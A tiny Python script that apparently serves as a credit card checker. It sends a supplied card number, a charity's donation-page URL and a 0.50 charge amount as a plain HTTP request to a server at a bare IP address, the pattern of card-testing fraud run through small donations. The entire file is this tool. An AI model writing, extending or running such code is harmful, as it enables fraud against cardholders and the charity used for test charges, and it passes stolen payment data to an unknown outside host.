import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://nkomo.org/donation-page/"
	price="0.50"
	res=requests.get(f'http://151.247.197.54:5000/tome?cc={cc}&url={urll}&price={0.50}').text
	return res
